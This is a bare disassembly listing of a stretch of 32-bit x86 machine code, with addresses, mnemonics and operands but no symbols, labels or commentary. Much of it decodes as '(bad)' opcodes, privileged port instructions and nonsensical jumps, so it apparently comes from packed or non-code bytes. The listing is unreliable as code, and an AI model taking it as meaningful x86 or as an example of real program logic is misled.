  4317ef:	inc    edi
  4317f0:	add    bh,0x51
  4317f3:	or     cl,ch
  4317f5:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4317fb:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431801:	mov    esp,0xf802b588
  431806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431807:	inc    ebp
  431808:	(bad)  
  431809:	cmp    bh,bh
  43180b:	pushf  
  43180c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431813:	mov    ecx,DWORD PTR [ebp-0x340018]
  431819:	into   
  43181a:	dec    DWORD PTR [ebx-0x7f72431c]
  431820:	push   0x5000ff01
  431825:	retf   
  431826:	inc    ebp
  431827:	into   
  431828:	dec    DWORD PTR [ebx-0x343f3ff4]
  43182e:	push   eax
  43182f:	into   
  431830:	call   0x4b1cc0
  431835:	retf   
  431836:	add    dh,cl
  431838:	add    bh,bh
  43183a:	mov    DWORD PTR [eax+ecx*1],edx
  43183d:	clc    
  43183e:	inc    ebp
  43183f:	inc    ebp
  431840:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  431846:	push   0x1
  431848:	push   edi
  431849:	add    BYTE PTR [eax-0x35],dl
  43184c:	mov    ecx,esi
  43184e:	cld    
  43184f:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  431855:	into   
  431856:	ror    BYTE PTR [ebx+0x75000800],0x50
  43185d:	xor    eax,DWORD PTR [ebp+0x3]
  431860:	jne    0x4318b3
  431862:	call   DWORD PTR [eax-0x3c]
  431865:	mov    DWORD PTR [ecx-0x18],edx
  431868:	mov    edi,edi
  43186a:	call   0x8b465df3
  43186f:	add    ah,ah
  431871:	rol    BYTE PTR [ebp-0x7c],0xeb
  431875:	add    edi,edi
  431877:	add    al,ch
  431879:	inc    ebp
  43187a:	push   ecx
  43187b:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431881:	mov    al,0xc7
  431883:	test   esp,esp
  431885:	clc    
  431886:	test   DWORD PTR [ebp-0x8],ecx
  431889:	add    BYTE PTR [ebp+0x51],0x39
  43188d:	jmp    0x8bcca12e
  431892:	in     al,dx
  431893:	or     BYTE PTR [ebp-0xf],al
  431896:	xor    eax,DWORD PTR [eax+0x4f896703]
  43189c:	hlt    
  43189d:	mov    eax,DWORD PTR [ebp-0x50]
  4318a0:	xor    esi,ecx
  4318a2:	add    eax,DWORD PTR [eax+0x4f086789]
  4318a8:	inc    ebp
  4318a9:	adc    esi,0x68
  4318ac:	pushf  
  4318ad:	inc    edi
  4318af:	add    al,ch
  4318b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4318b2:	test   edi,edi
  4318b4:	clc    
  4318b5:	inc    DWORD PTR [ebp-0x73]
  4318b8:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  4318bc:	(bad)  
  4318bd:	push   ecx
  4318be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4318bf:	jne    0x431846
  4318c1:	push   eax
  4318c2:	clc    
  4318c3:	test   DWORD PTR [ebp-0x1],eax
  4318c6:	cmp    eax,0xc78b9cff
  4318cb:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4318d2:	inc    ebp
  4318d3:	push   edi
  4318d4:	aas    
  4318d5:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  4318dc:	dec    ebp
  4318dd:	add    BYTE PTR [ebx],dh
  4318df:	inc    ebp
  4318e0:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4318e6:	enter  0x8401,0x0
  4318ea:	add    al,BYTE PTR [eax]
  4318ec:	add    bh,bh
  4318ee:	out    dx,eax
  4318ef:	sbb    BYTE PTR [eax],al
  4318f1:	dec    ebp
  4318f2:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4318f8:	sub    esi,DWORD PTR [ebx]
  4318fa:	mov    ebp,DWORD PTR [eax-0x8]
  4318fd:	add    bl,0x0
  431900:	(bad)  
  431901:	cmp    eax,ecx
  431903:	or     BYTE PTR [edx+0x750114],al
  431909:	inc    DWORD PTR [ebp+0x18]
  43190c:	mov    eax,DWORD PTR [ebp-0x8]
  43190f:	mov    ebx,eax
  431911:	(bad)  
  431912:	retf   
  431913:	inc    ebp
  431914:	into   
  431915:	mov    esi,eax
  431917:	int3   
  431918:	scas   eax,DWORD PTR es:[edi]
  431919:	push   es
  43191a:	mov    esi,DWORD PTR [ebp-0xc]
  43191d:	call   DWORD PTR [ebp+0x18]
  431920:	sub    edi,DWORD PTR [ebp+0x3b]
  431923:	mov    esi,DWORD PTR [edi-0x34]
  431926:	mov    eax,DWORD PTR [ebp-0x8]
  431929:	ss ret 
  43192b:	pushf  
  43192c:	mov    bh,0xbc
  43192f:	fadd   QWORD PTR [eax]
  431931:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  431937:	mov    esi,DWORD PTR [ebx]
  431939:	in     al,0x33
  43193b:	ret    
  43193c:	add    eax,esi
  43193e:	add    eax,DWORD PTR [ebp+0xf]
  431941:	mov    eax,ecx
  431943:	in     al,0x4d
  431945:	ret    
  431946:	mov    eax,esi
  431948:	in     al,dx
  431949:	inc    ebp
  43194a:	rol    edi,1
  43194c:	sar    al,1
  43194e:	or     BYTE PTR [ebp+0x45e9f845],al
  431954:	add    BYTE PTR [eax],bh
  431956:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  43195d:	test   ebx,eax
  43195f:	clc    
  431960:	retf   
  431961:	inc    ebp
  431962:	into   
  431963:	cmp    al,dh
  431965:	pushf  
  431966:	scas   eax,DWORD PTR es:[edi]
  431967:	(bad)  
  431968:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  43196f:	inc    ebp
  431970:	cmp    edi,DWORD PTR [edi+esi*2]
  431973:	pushf  
  431974:	mov    eax,edi
  431976:	mov    esp,0x458567a8
  43197b:	clc    
  43197c:	mov    eax,DWORD PTR [ebp-0x8]
  43197f:	mov    eax,ebx
  431981:	in     al,dx
  431982:	retf   
  431983:	ret    
  431984:	into   
  431985:	mov    dh,0x7d
  431988:	scas   eax,DWORD PTR es:[edi]
  431989:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  43198f:	add    BYTE PTR [ebx],ch
  431991:	jmp    0xba1ad1
  431996:	mov    eax,DWORD PTR [ebp-0x5c]
  431999:	mov    eax,DWORD PTR [ebp-0x14]
  43199c:	inc    ebp
  43199d:	enter  0x458b,0xf8
  4319a1:	xor    eax,ebx
  4319a3:	add    ecx,ebx
  4319a5:	cmp    ecx,esi
  4319a7:	shufps xmm7,xmm4,0xaf
  4319ab:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4319b1:	dec    ebp
  4319b2:	sub    esi,DWORD PTR [ebx]
  4319b4:	cmp    esi,DWORD PTR [ebx]
  4319b6:	ja     0x4319bb
  4319b8:	mov    eax,DWORD PTR [ebx]
  4319ba:	lods   al,BYTE PTR ds:[esi]
  4319bb:	mov    db0,ecx
  4319be:	inc    ebp
  4319bf:	dec    ebp
  4319c0:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4319c6:	retf   
  4319c7:	rol    dh,1
  4319c9:	or     al,0xce
  4319cb:	inc    ebp
  4319cc:	scas   eax,DWORD PTR es:[edi]
  4319cd:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4319d3:	add    BYTE PTR [ebx],ch
  4319d5:	add    BYTE PTR [ebx],bh
  4319d7:	inc    ebp
  4319d8:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4319de:	inc    ebp
  4319df:	retf   
  4319e0:	mov    ecx,esi
  4319e2:	clc    
  4319e3:	(bad)  
  4319e4:	retf   
  4319e5:	scas   eax,DWORD PTR es:[edi]
  4319e6:	ret    
  4319e7:	mov    ecx,esi
  4319e9:	hlt    
  4319ea:	(bad)  
  4319eb:	push   ebp
  4319ec:	scas   eax,DWORD PTR es:[edi]
  4319ed:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4319f3:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4319f9:	add    BYTE PTR [ebx],al
  4319fb:	mov    eax,eax
  4319fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4319fe:	inc    ebp
  4319ff:	dec    ebp
  431a00:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431a08:	inc    ebp
  431a09:	(bad)  
  431a0b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431a13:	sar    eax,1
  431a15:	rol    BYTE PTR [ebp+0x5],1
  431a18:	xor    eax,DWORD PTR [ebp+0x3]
  431a1b:	jmp    0x431a08
  431a1d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  431a23:	xor    eax,DWORD PTR [ebp+0x33]
  431a26:	mov    eax,DWORD PTR [ebx]
  431a28:	rol    BYTE PTR [ebx],1
  431a2a:	test   BYTE PTR [edi],cl
  431a2c:	cdq    
  431a2d:	shl    DWORD PTR [edx],0x4d
  431a30:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  431a36:	xor    edx,eax
  431a38:	add    eax,DWORD PTR ds:0xeb4d45e0
  431a3e:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  431a44:	add    BYTE PTR [ebx],dh
  431a46:	inc    ebp
  431a47:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  431a4d:	rdpmc  
  431a4f:	rol    DWORD PTR [ebx],0x4d
  431a52:	loopne 0x4319df
  431a54:	push   ebp
  431a55:	in     al,dx
  431a56:	mov    cl,dl
  431a58:	adc    eax,edx
  431a5a:	jb     0x431a61
  431a5c:	add    BYTE PTR [ebp+0x45],al
  431a5f:	jmp    0x4319ec
  431a61:	mov    ebx,eax
  431a63:	test   al,0xcb
  431a65:	dec    ebp
  431a66:	dec    ebp
  431a67:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  431a6d:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  431a73:	dec    ebp
  431a74:	mov    al,0x8b
  431a76:	dec    ebp
  431a77:	in     al,dx
  431a78:	xor    edx,ecx
  431a7a:	xor    edx,eax
  431a7c:	add    eax,DWORD PTR [ebp+0x3]
  431a7f:	jbe    0x431a90
  431a81:	mov    eax,ecx
  431a83:	test   al,0x45
  431a85:	dec    ebp
  431a86:	mov    DWORD PTR [ebx],esi
  431a88:	loopne 0x431abd
  431a8a:	inc    ebp
  431a8b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431a91:	rol    esi,0x45
  431a94:	scas   eax,DWORD PTR es:[edi]
  431a95:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  431a9b:	mov    eax,ecx
  431a9d:	hlt    
  431a9e:	dec    ebp
  431a9f:	inc    ebp
  431aa0:	mov    eax,edi
  431aa2:	loopne 0x431a7c
  431aa4:	retf   
  431aa5:	test   esi,ecx
  431aa7:	clc    
  431aa8:	scas   eax,DWORD PTR es:[edi]
  431aa9:	inc    ebp
  431aaa:	mov    eax,edi
  431aac:	fdiv   st,st(0)
  431aae:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  431ab4:	cdq    
  431ab5:	cmp    BYTE PTR [edx],dh
  431ab7:	pushf  
  431ab8:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  431abe:	inc    esi
  431ac0:	mov    ebp,DWORD PTR [eax-0x10]
  431ac3:	inc    ebp
  431ac4:	dec    ebp
  431ac5:	xor    esi,DWORD PTR [ebx]
  431ac7:	add    eax,DWORD PTR [ebx]
  431ac9:	loopne 0x431ada
  431acb:	dec    ebp
  431acc:	ror    DWORD PTR [edx+0x7233084d],0x3
  431ad3:	add    BYTE PTR [ebx-0x7b740bbb],cl
  431ad9:	lock cdq 
  431adb:	ret    
  431adc:	xor    al,BYTE PTR [ebp-0x77]
  431adf:	mov    esi,esp
  431ae1:	rol    BYTE PTR [ebp-0x7c],1
  431ae4:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  431aea:	call   edi
  431aec:	enter  0x4d45,0x8b
  431af0:	mov    esi,eax
  431af2:	fmul   st(3),st
  431af4:	push   ebp
  431af5:	dec    ebp
  431af6:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  431afc:	ret    0xc199
  431aff:	xor    al,BYTE PTR [esi-0x280276]
  431b05:	dec    ebp
  431b06:	jne    0x431b3b
  431b08:	mov    eax,DWORD PTR [ebx]
  431b0a:	cld    
  431b0b:	loopne 0x431abd
  431b0d:	push   ebp
  431b0e:	add    DWORD PTR [eax+0x72851100],ecx
  431b14:	inc    DWORD PTR [eax]
  431b16:	inc    DWORD PTR [ebp-0x75]
  431b19:	mov    edi,esp
  431b1b:	lock add bl,0x1
  431b1f:	retf   
  431b20:	add    dh,al
  431b22:	xor    dh,cl
  431b24:	inc    ebp
  431b25:	scas   eax,DWORD PTR es:[edi]
  431b26:	mov    eax,DWORD PTR [ebx]
  431b28:	shl    al,0x0
  431b2b:	inc    ebp
  431b2c:	dec    DWORD PTR [ebx+0x4dccf0ff]
  431b32:	call   0x462d6a
  431b37:	ud0    eax,ecx
  431b3a:	adc    al,0x4d
  431b3c:	inc    ebp
  431b3d:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  431b43:	lock push 0x338055
  431b49:	add    eax,DWORD PTR [eax]
  431b4b:	ud0    ecx,edx
  431b4e:	sbb    BYTE PTR [ebp+0x5e],dl
  431b51:	xor    ecx,ecx
  431b53:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  431b5a:	push   ecx
  431b5b:	add    BYTE PTR [ebp-0x38],cl
  431b5e:	mov    DWORD PTR [esi-0x740004],eax
  431b64:	cld    
  431b65:	inc    ebp
  431b66:	nop
  431b67:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  431b6d:	xabort 0xaf
  431b70:	icebp  
  431b71:	mov    esi,DWORD PTR [ebp-0x28]
  431b74:	(bad)  
  431b75:	retf   
  431b76:	or     ecx,eax
  431b78:	(bad)  
  431b79:	dec    ebp
  431b7a:	pop    es
  431b7b:	(bad)  
  431b7c:	(bad)  
  431b7d:	or     BYTE PTR [esi],al
  431b7f:	jb     0x431b47
  431b81:	add    BYTE PTR [ebx],al
  431b83:	inc    ebp
  431b84:	(bad)  
  431b85:	mov    ecx,DWORD PTR [edx]
  431b87:	fadd   st(6),st
  431b89:	ret    
  431b8a:	add    ah,BYTE PTR [edi-0x37]
  431b8d:	int    0x55
  431b8f:	sub    ebp,esp
  431b91:	add    edx,DWORD PTR [ecx-0x14]
  431b94:	inc    ebp
  431b95:	inc    ebp
  431b96:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431b9c:	cld    
  431b9d:	(bad)  
  431b9e:	mov    WORD PTR [edi+0xf893be0],gs
  431ba4:	mov    ebp,ebp
  431ba6:	clc    
  431ba7:	push   eax
  431ba9:	push   DWORD PTR [ebp-0x4]
  431bac:	mov    BYTE PTR [ebp+0xa],0xff
  431bb0:	(bad)  
  431bb1:	int3   
  431bb2:	or     BYTE PTR [eax],al
  431bb4:	(bad)  
  431bb5:	lea    eax,[edi]
  431bb7:	ins    BYTE PTR es:[edi],dx
  431bb8:	(bad)  
  431bb9:	inc    DWORD PTR [ecx]
  431bbb:	push   eax
  431bbc:	mov    BYTE PTR [ebp+0x9],0x8b
  431bc0:	leave  
  431bc1:	les    edx,FWORD PTR [ebp+0x0]
  431bc4:	in     al,dx
  431bc5:	call   DWORD PTR [ecx-0x75]
  431bc8:	inc    ebp
  431bc9:	cld    
  431bca:	mov    DWORD PTR [eax+0x8b01fc],eax
  431bd0:	cld    
  431bd1:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431bd7:	std    
  431bd8:	mov    eax,DWORD PTR [eax]
  431bda:	clc    
  431bdb:	test   eax,esi
  431bdd:	je     0x431c54
  431bdf:	mov    eax,esi
  431be1:	cld    
  431be2:	add    al,0x80
  431be4:	add    WORD PTR [ecx+0x0],ax
  431be8:	fiadd  DWORD PTR [eax]
  431bea:	mov    BYTE PTR [eax],0xd6
  431bed:	push   0xffffffc3
  431bef:	push   edi
  431bf0:	mov    edx,DWORD PTR [eax+0x51]
  431bf3:	pop    edi
  431bf4:	lea    ebx,[ebx-0x8]
  431bf7:	ret    0x45
  431bfa:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431c00:	xchg   eax,edi
  431c02:	mov    DWORD PTR [ebp-0x75],ecx
  431c05:	push   esi
  431c06:	clc    
  431c07:	jne    0x431bd9
  431c09:	mov    ecx,0xf8450b0b
  431c0e:	(bad)  
  431c0f:	push   cs
  431c10:	or     BYTE PTR [ebp-0x3a],dh
  431c13:	cmp    eax,DWORD PTR [ecx]
  431c15:	pop    esi
  431c16:	(bad)  
  431c17:	or     al,0x5
  431c19:	inc    eax
  431c1a:	leave  
  431c1b:	jmp    0x40cf:0x21564204
  431c22:	leave  
  431c23:	jmp    0xdace5d27
  431c28:	mov    eax,DWORD PTR [edx-0x3a]
  431c2b:	jle    0x431c23
  431c2d:	inc    eax
  431c2e:	nop
  431c2f:	in     al,dx
  431c30:	inc    ebx
  431c32:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431c38:	add    eax,0xff45e8f8
  431c3d:	push   esi
  431c3e:	push   DWORD PTR [ebp-0x39]
  431c41:	mov    eax,0x7e9da46
  431c46:	or     al,0x6
  431c48:	push   DWORD PTR [ebp-0x3a]
  431c4b:	cmp    eax,DWORD PTR [edx]
  431c4d:	pop    esi
  431c4e:	ret    
  431c4f:	or     al,0x56
  431c51:	inc    ecx
  431c52:	push   ebp
  431c53:	jle    0x431c41
  431c55:	inc    edx
  431c56:	inc    ebp
  431c57:	leave  
  431c58:	add    DWORD PTR [ecx+0x28],eax
  431c5b:	and    esp,edi
  431c5d:	inc    ecx
  431c5e:	jne    0x431c47
  431c60:	add    DWORD PTR [edx+0x1c],eax
  431c63:	retf   0xc38b
  431c66:	adc    al,0x8b
  431c68:	xchg   edx,eax
  431c69:	push   ecx
  431c6a:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431c70:	rcl    DWORD PTR [esi-0x9],cl
  431c73:	jne    0x431cc5
  431c75:	mov    eax,0x7c80ece
  431c7a:	rol    DWORD PTR [esi],cl
  431c7c:	div    DWORD PTR [ebp+0x50]
  431c7f:	cmp    ecx,edx
  431c81:	pop    esi
  431c82:	dec    BYTE PTR [edx]
  431c84:	in     al,dx
  431c85:	inc    edx
  431c86:	sub    ebp,ebp
  431c88:	inc    eax
  431c89:	(bad)  
  431c8a:	push   eax
  431c8b:	add    edx,DWORD PTR [eax-0x13]
  431c8e:	push   edi
  431c8f:	add    dh,dh
  431c91:	leave  
  431c92:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431c96:	add    BYTE PTR [ecx+0x0],dl
  431c99:	inc    ebp
  431c9a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431ca0:	add    BYTE PTR [eax-0x7fbf448],bh
  431ca6:	add    al,0x2
  431ca8:	jmp    0x57ec802
  431cad:	jne    0x431c97
  431caf:	mov    eax,DWORD PTR [edx]
  431cb1:	or     BYTE PTR [eax],al
  431cb3:	inc    ecx
  431cb4:	stc    
  431cb5:	jmp    0xe7825cf0
  431cba:	jge    0x431cfd
  431cbc:	mov    esi,ebp
  431cbe:	lock ret 0x7d
  431cc2:	and    ecx,DWORD PTR [ebx-0x171777]
  431cc8:	add    bh,bh
  431cca:	aad    0xd7
  431ccc:	add    dh,cl
  431cce:	clts   
  431cd0:	(bad)  
  431cd1:	call   0xffce1bd6
  431cd6:	hlt    
  431cd7:	iret   
  431cd8:	jge    0x431cb0
  431cda:	rol    DWORD PTR [esi-0x80],cl
  431cdd:	cmc    
  431cde:	or     BYTE PTR [edi-0x27],cl
  431ce1:	(bad)  
  431ce2:	out    dx,al
  431ce3:	mov    eax,DWORD PTR [ebx]
  431ce5:	(bad)  
  431ce6:	pop    esi
  431ce7:	push   es
  431ce8:	cmp    al,0xe8
  431cea:	sar    edi,0x8
  431ced:	inc    DWORD PTR [edi]
  431cef:	inc    esi
  431cf0:	(bad)  
  431cf1:	in     al,dx
  431cf2:	jle    0x431d4b
  431cf4:	push   cs
  431cf5:	push   ebx
  431cf6:	add    BYTE PTR [ebx+0x24008b56],cl
  431cfc:	add    BYTE PTR [ebp+0x50],al
  431cff:	push   eax
  431d00:	add    DWORD PTR [ebx+0x757d1834],ecx
  431d06:	sub    edx,DWORD PTR [esi-0x24]
  431d09:	jne    0x431cc1
  431d0b:	lods   eax,DWORD PTR ds:[esi]
  431d0c:	mov    edx,DWORD PTR [edx-0x34]
  431d0f:	dec    esi
  431d10:	out    0x83,eax
  431d12:	into   
  431d13:	push   edi
  431d15:	loopne 0x431ce5
  431d17:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431d1b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431d22:	rol    DWORD PTR [edx],0x8
  431d25:	mov    esp,ecx
  431d27:	cmp    DWORD PTR [ebx],0xc
  431d2a:	mov    esi,0x5001c0
  431d2f:	push   eax
  431d30:	push   cs
  431d31:	push   eax
  431d32:	(bad)  
  431d33:	sub    edx,edi
  431d35:	push   esi
  431d36:	adc    al,0xcb
  431d38:	ins    DWORD PTR es:[edi],dx
  431d39:	mov    eax,0x203e8
  431d3e:	add    al,ah
  431d40:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431d47:	add    dh,al
  431d49:	add    ah,ch
  431d4b:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431d51:	pop    ecx
  431d52:	or     eax,ebx
  431d54:	cli    
  431d55:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431d5b:	lea    ebp,[ebx]
  431d5d:	mov    edx,DWORD PTR [edx-0x4]
  431d60:	dec    ecx
  431d61:	inc    ebp
  431d62:	shr    BYTE PTR [ebx],0x4b
  431d65:	and    al,0x0
  431d67:	(bad)  
  431d68:	jne    0x431daf
  431d6a:	pop    eax
  431d6b:	mov    al,0x5a
  431d6d:	call   0x1421fcc
  431d72:	and    al,0x85
  431d74:	push   edx
  431d75:	add    BYTE PTR [eax+eax*1+0x0],ah
  431d79:	dec    ebp
  431d7a:	mov    cl,0x23
  431d7c:	jmp    0x431d6a
  431d7e:	mov    al,0xe7
  431d80:	call   0x139206e
  431d85:	shr    DWORD PTR [eax+ebx*2],cl
  431d88:	lock (bad) 
  431d8a:	adc    eax,0x757f008d
  431d8f:	out    0x58,eax
  431d91:	cmp    al,0x7
  431d93:	pop    edx
  431d94:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431d9b:	push   ecx
  431d9c:	cld    
  431d9d:	mov    esi,0x3b0175
  431da2:	and    al,0xb0
  431da4:	xor    BYTE PTR [edx+0x1],0x8b
  431da8:	add    ah,bh
  431daa:	mov    edi,DWORD PTR [ebp-0x4]
  431dad:	psubsw mm7,QWORD PTR [edi]
  431db0:	add    DWORD PTR [ebp+0x0],ebp
  431db3:	rcr    eax,1
  431db5:	mov    edi,ecx
  431db7:	and    eax,DWORD PTR [eax]
  431db9:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431dbf:	call   0x13020a8
  431dc4:	add    al,cl
  431dc6:	mov    ebp,esi
  431dc8:	aam    0x83
  431dca:	or     DWORD PTR [ecx],eax
  431dcc:	jne    0x431dbf
  431dce:	mov    eax,DWORD PTR [eax]
  431dd0:	aam    0x0
  431dd2:	dec    ebp
  431dd3:	jne    0x431d60
  431dd5:	cmp    ebx,eax
  431dd7:	jb     0x431e26
  431dd9:	jmp    0x431d66
  431ddb:	mov    ebx,esp
  431ddd:	int3   
  431dde:	dec    ebp
  431ddf:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431de6:	mov    edx,0x8b0a8b
  431deb:	cmp    ecx,DWORD PTR [eax]
  431ded:	jb     0x431dc6
  431def:	pop    edx
  431df0:	push   edi
  431df1:	cli    
  431df2:	pop    es
  431df3:	mov    eax,ecx
  431df5:	jb     0x431df9
  431df7:	add    DWORD PTR [ebx],0xa
  431dfa:	mov    eax,DWORD PTR [ebx]
  431dfc:	int3   
  431dfd:	add    bh,BYTE PTR [esi+0x75d10006]
  431e03:	jmp    0x431d90
  431e05:	mov    al,0xe8
  431e07:	call   0x1042089
  431e0c:	add    edx,DWORD PTR [ecx+ecx*8]
  431e0f:	pop    edi
  431e10:	or     BYTE PTR [ecx-0x73],bl
  431e13:	pop    ecx
  431e14:	inc    edi
  431e15:	xor    al,0xeb
  431e17:	push   ecx
  431e18:	mov    edi,DWORD PTR [edx+0xc506cc]
  431e1e:	call   0xb21f23
  431e23:	int3   
  431e24:	sbb    BYTE PTR [esi],ch
  431e26:	inc    ebp
  431e27:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431e2d:	call   0x9c209c
  431e32:	or     BYTE PTR [ebx-0x73],dl
  431e35:	cmp    al,0x47
  431e37:	mov    al,0x1
  431e39:	jb     0x431e3b
  431e3b:	mov    al,0x10
  431e3d:	push   eax
  431e3e:	add    al,0x75
  431e40:	add    BYTE PTR [ebx],ch
  431e42:	add    ebx,esp
  431e44:	int3   
  431e45:	jne    0x431e57
  431e47:	movsx  edx,cl
  431e4a:	add    DWORD PTR [eax],eax
  431e4c:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431e53:	mov    gs,edi
  431e55:	add    BYTE PTR [eax-0x50],ch
  431e58:	add    al,ch
  431e5a:	mov    eax,DWORD PTR [ecx]
  431e5c:	sub    eax,DWORD PTR [eax]
  431e5e:	jb     0x431ed5
  431e60:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431e64:	jge    0x431e4e
  431e66:	add    al,0x1
  431e68:	add    DWORD PTR [eax],0x0
  431e6b:	jne    0x431e6d
  431e6d:	je     0x431eb4
  431e6f:	mov    eax,DWORD PTR [edi]
  431e71:	ror    BYTE PTR [ebp+0x4d],1
  431e74:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431e7b:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431e81:	mov    DWORD PTR [ebx],ebp
  431e83:	fadd   DWORD PTR [eax+0x75]
  431e86:	inc    eax
  431e87:	pop    eax
  431e88:	lea    ebx,[ecx+0x4f]
  431e8b:	push   0xb1000003
  431e90:	out    dx,eax
  431e91:	add    ebp,DWORD PTR [edx+edx*2]
  431e94:	add    BYTE PTR [ebx+ecx*4],bh
  431e97:	mov    ch,BYTE PTR [ebx]
  431e99:	jb     0x431f0d
  431e9b:	add    al,0x89
  431e9d:	push   eax
  431e9e:	call   0x842b6c10
  431ea3:	add    DWORD PTR [eax+eax*1],eax
  431ea6:	jae    0x431ebc
  431ea8:	icebp  
  431ea9:	inc    ebp
  431eaa:	mov    eax,DWORD PTR gs:[ecx]
  431ead:	int3   
  431eae:	out    dx,al
  431eaf:	loopne 0x431efe
  431eb1:	sub    eax,DWORD PTR [edx]
  431eb3:	push   0xffffff83
  431eb5:	pop    esi
  431eb6:	push   cs
  431eb7:	jl     0x431ed2
  431eb9:	add    al,0xaf
  431ebb:	xor    eax,0x832b6d00
  431ec0:	mov    eax,DWORD PTR [edx]
  431ec2:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431ec8:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431ece:	inc    ebp
  431ecf:	shr    ebx,0x3
  431ed2:	or     DWORD PTR [eax],0x4
  431ed5:	push   0xffffffa5
  431ed7:	pop    esi
  431ed8:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431edf:	jmp    0x431f3e
  431ee1:	mov    edi,0xff0272
  431ee6:	fdivr  QWORD PTR [ebp+0x5d]
  431ee9:	push   0x4e
  431eeb:	pop    ecx
  431eec:	call   0x4362f1
  431ef1:	mov    DWORD PTR [ebx],eax
  431ef3:	in     al,0xc8
  431ef5:	rol    BYTE PTR [ebp-0x75],0xc1
  431ef9:	call   0xad20da
  431efe:	pop    esi
  431eff:	enter  0xceff,0x8b
  431f03:	repz mov ecx,DWORD PTR [ebp-0x34]
  431f07:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431f0e:	je     0x431f10
  431f10:	or     DWORD PTR [ebx-0x74183b24],eax
  431f16:	jne    0x431efc
  431f18:	jmp    0x431f13
  431f1a:	push   DWORD PTR [edx-0x24]
  431f1d:	push   0x4d
  431f1f:	pop    ecx
  431f20:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431f24:	jge    0x431f2c
  431f26:	mov    eax,eax
  431f28:	sub    ebp,DWORD PTR [edx+0x24]
  431f2b:	pop    esi
  431f2c:	inc    ebp
  431f2d:	mov    esp,0x8b6077
  431f32:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431f38:	lods   al,BYTE PTR ds:[esi]
  431f39:	add    BYTE PTR [ebx],bh
  431f3b:	enter  0xce73,0x49
  431f3f:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431f47:	stc    
  431f48:	jge    0x431fbc
  431f4a:	jnp    0xdd42a2b9
  431f50:	call   0xc62026
  431f55:	fadd   st(0),st
  431f57:	dec    esi
  431f58:	ins    BYTE PTR es:[edi],dx
  431f59:	stc    
  431f5a:	cmp    al,0x73
  431f5c:	push   ebp
  431f5d:	mov    eax,0xf8028b
  431f62:	jne    0x431f25
  431f64:	mov    esi,ecx
  431f66:	mov    esp,DWORD PTR [ebp+0x2c]
  431f69:	add    edi,DWORD PTR [ebp-0x24]
  431f6c:	sub    esp,eax
  431f6e:	and    al,0x45
  431f70:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431f76:	sbb    al,0xee
  431f78:	pop    esi
  431f79:	call   0x831fa9
  431f7e:	fsubr  st,st(3)
  431f80:	sti    
  431f81:	add    BYTE PTR gs:[ecx],bh
  431f84:	add    eax,esp
